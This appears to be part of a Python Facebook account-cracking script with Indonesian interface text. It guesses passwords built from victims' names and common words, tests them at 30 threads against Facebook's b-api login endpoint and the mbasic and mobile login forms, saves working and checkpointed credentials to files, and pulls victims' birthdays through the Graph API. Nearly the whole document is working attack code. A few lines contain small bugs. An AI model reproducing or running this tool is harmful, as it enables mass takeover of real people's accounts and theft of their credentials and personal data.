	elif fiisayangwidiya in ["2","02"]:
		print(f"{B}[•] Tampilkan opsi chekpoint {B}Y/T")
		print(f"{B}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		_checkoptions_=input(f"{P}[•] Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{B}[•] Crack menggunakan password manual/default {B}M/D")
					ter =input(f"{B}[•] Pilih : {P}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B}[•] Contoh password : {P}sayang,anjing,kontol")
							asu = input(f"{B}[•] Buat sandi : {P} ").split(",")
							if len(asu) =="":
								print(f"{B}[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mbasic, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{B}[•] Crack menggunakan pasword manual/defaults {B}M/D")
			ter =input(f"{B}[•] Pilih : {P}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B}[•] Contoh password {P}Anjink,kontol,sayang")
					asu = input(f"{B}[•] Buat sandi : {P}").split(",")
					if len(asu) =="":
						print(f"{B}[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"321", frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mbasicc, uid, fii)
				exit()
				
def kone():
    print(f"{B}[1] B-api > {P}SANGAT CEPET")
    print(f"{B}[2] Mbasic > {P}KALEM")
    print(f"{B}[3] Mobile > {P}SANGAT KALEM")

def started():
    jalan(f"{B}[•]{P} Results {H}OK {P}tersimpan di {H}OK/{tanggal}")
    jalan(f"{B}[•]{P} Results {K}CP {P}tersimpan di {K}CP/{tanggal}")
    jalan(f"{B}[•] Jika tidak hasil pindahkan kartu SIM dulu")
    jalan(f"{B}[•] Butuh kesabaran Crack nya lambat")
    print(f"{B}================================================={P}")

def api(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie
    sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B}----> {H}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B}----> {K}{uid}•{pw}•{day} {month} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            print(f"\r{B}----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B}----> {H}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B}----> {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B}----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B}----> {H}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B}----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B}----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B}----> {H}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B}----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B}----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mobil(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mobile.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B}----> {H}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B}----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B}----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobill(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B}----> {H}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B}----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		print(f"\r{P}[•]{K}-----> {B}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
		if "0" in str(len(ngew)):
			jalan(f"{P}[•]{I} Hore akunya tab yesss, silahkan di login ")
	elif "login_error" in str(run):
		jalan(f"\r{P}[•]{K}----> {B}{uid}•{pw}")
	else:
		jalan(f"\r{P}[•]{K}----> {B}{uid}•{pw}")


if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    menu()